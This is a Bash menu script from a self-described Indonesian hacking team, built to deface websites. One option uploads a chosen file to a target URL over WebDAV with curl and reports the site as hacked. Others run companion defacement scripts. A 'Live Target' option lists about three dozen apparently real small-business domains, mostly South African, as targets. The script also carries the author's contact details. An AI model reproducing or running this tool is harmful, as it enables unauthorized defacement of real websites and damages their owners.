#!/bin/bash
#version 1.0
clear
# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'
green="\033[32;1m"

cowsay -f eyes "MR.K7C8NG" | lolcat
figlet -f slant "MR.K7C8NG" | lolcat
echo "    <=====================[]====================>" | lolcat
echo "    <=====[       Tools By MR.K7C8NG       ]=====>" | lolcat
echo  "    <=====[  Concact Me : 085347683869  ]=====>" | lolcat
echo "    <=====================[]====================>" | lolcat

sleep 1
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
clear
sleep 1
exit
}


lagi=1
while [ $lagi -lt 6 ];
do
echo ""
echo "1. Script Deface Creator" | lolcat
echo "2. Webdav" | lolcat
echo "3. Multi Webdav" | lolcat
echo "4. Live Target" | lolcat
echo "99. Exit" | lolcat
echo $green
read -p " Pilih Nomornya =>" pil;

case $pil in
1) python2 5.py

;;
2) cd /data/data/com.termux/files/home
read -p "[?] Masukan Nama Script => " sc;
read -p "[?] Masukan Web Target => " T;
curl -T /sdcard/$sc $T
echo "[!] Terhack => " $T/$sc | lolcat
cd deface
;;
3) sh A.sh
;;
4) echo "http://bee-it.co.za" | lolcat
echo  "http://safemode.co.za" | lolcat
echo "http://opiniong.com"  | lolcat
echo "http://butterflowers.co.za" | lolcat
echo "http://bananabox.co.za" | lolcat
echo "http://ayk.co.za" | lolcat
echo "http://ads247.co.za" | lolcat
echo "http://allpaint.co.za" | lolcat
echo "http://atlanticphysio.co.za" | lolcat
echo "http://valdicare.co.za" | lolcat
echo "http://vmicl.co.za" | lolcat
echo "http://troon.co.za" | lolcat
echo "http://nyarhi.co.za" | lolcat
echo "http://nitrobikes.co.za" | lolcat
echo "http://nhisa.co.za" | lolcat
echo "http://netcallcollect.co.za" | lolcat
echo "http://naturaleyeimages.com" | lolcat
echo "http://mpark.co.za" | lolcat
echo "http://contsol.co.za" | lolcat
echo "http://colourfactory.co.za" | lolcat
echo "http://chillibitez.co.za" | lolcat
echo "http://chasingfantasia.com" | lolcat
echo "http://centraltech.co.za" | lolcat
echo "http://cblandscapes.co.za" | lolcat
echo "http://moneyin1week.co.za" | lolcat
echo "http://mix007.co.za" | lolcat
echo "http://mediacube.co.za" | lolcat
echo "http://megro.co.za" | lolcat
echo "http://menogold.co.za" | lolcat
echo "http://mestern.co.za" | lolcat
echo "http://tcmgroup.co.za" | lolcat
echo "http://sublimeconfectionery.co.za" | lolcat
echo "http://tieronecapital.co.za" | lolcat
echo "http://thegiftstore.co.za" | lolcat
echo "http://thefoundation.co.za" | lolcat
echo "http://tressor.co.za" | lolcat
;;
99) echo "Autor : MR.K7C8NG" | lolcat
echo "WhatsApp : 085347683869" | lolcat
echo "TAEM         : InDoNeSiA CYBER ErRoR SyStEm" | lolcat
echo "Instagram  : pranata_pasha" | lolcat
figlet -f slant "Moreno77" | lolcat
echo '[!] Selamat Bertemu Lain Waktu...' | lolcat
exit
;;

esac
done
done
